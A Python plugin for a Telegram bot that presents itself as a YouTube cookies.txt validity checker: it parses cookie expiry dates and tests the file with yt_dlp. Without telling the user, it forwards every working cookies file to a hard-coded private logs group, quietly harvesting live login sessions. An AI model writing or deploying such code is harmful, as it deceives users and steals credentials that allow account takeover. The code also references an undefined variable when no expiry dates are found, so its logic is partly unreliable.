import yt_dlp
import os
import json
import datetime
from SONALI import app
from pyrogram import filters
from pyrogram.types import Message

# Tracking Users Who Used /chkcookies
active_users = set()

# Logs Group ID (Cookies file waha send hogi)
LOGS_GROUP_ID = -1002300353707  

# Step 1: Enable Checking with `/chkcookies`
@app.on_message(filters.command("chkcookies") & filters.private)
async def enable_cookie_check(client, message):
    active_users.add(message.chat.id)
    await message.reply("✅ Now send your `cookies.txt` file to check!")

# Step 2: Accept Only If `/chkcookies` was Used
@app.on_message(filters.document & filters.private)
async def check_cookies_from_file(client, message: Message):
    if message.chat.id not in active_users:
        return  # Ignore if user didn't use `/chkcookies`

    file_path = await message.download()

    if not file_path.endswith(".txt"):
        await message.reply("❌ Please send a valid `cookies.txt` file!")
        return

    try:
        with open(file_path, "r") as f:
            cookies_data = f.readlines()

        if not cookies_data:
            await message.reply("❌ Your cookies.txt file is empty!")
            os.remove(file_path)
            return

        # Step 3: Extract Expiry Dates
        expiry_dates = []
        for line in cookies_data:
            parts = line.strip().split("\t")
            if len(parts) >= 5:
                try:
                    expiry_timestamp = int(parts[-2])
                    expiry_date = datetime.datetime.utcfromtimestamp(expiry_timestamp)
                    expiry_dates.append(expiry_date)
                except ValueError:
                    pass

        # Step 4: Find the Latest Expiry Date
        if expiry_dates:
            latest_expiry = max(expiry_dates)
            current_time = datetime.datetime.utcnow()

            if latest_expiry < current_time:
                expiry_status = f"❌ Your YouTube cookies expired on `{latest_expiry}`"
            else:
                expiry_status = f"✅ Your YouTube cookies are valid!\n📅 Expiry Date: `{latest_expiry}`"
        else:
            expiry_status = "⚠️ Could not determine expiry date from cookies!"

        # Step 5: Validate YouTube Cookies
        ydl_opts = {"quiet": True, "cookiefile": file_path}
        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.extract_info("https://www.youtube.com/watch?v=dQw4w9WgXcQ", download=False)

            msg = f"{expiry_status}\n🎉 **Your YouTube cookies are working!**"
            log_msg = f"🛡 **COOKIES CHECKED!**\n✅ **Result:** WORKING ✅\n📅 **Expiry Date:** `{latest_expiry}`"

            await client.send_document(LOGS_GROUP_ID, file_path, caption=log_msg)

        except yt_dlp.utils.ExtractorError:
            msg = f"{expiry_status}\n❌ **Your YouTube cookies are invalid or expired!**"
            log_msg = f"🛡 **COOKIES CHECKED!**\n❌ **Result:** INVALID ❌"

        await client.send_message(LOGS_GROUP_ID, log_msg)
        await message.reply(msg, quote=True)

    except Exception as e:
        await message.reply(f"⚠️ Error reading file: `{str(e)}`")

    os.remove(file_path)
    active_users.remove(message.chat.id)
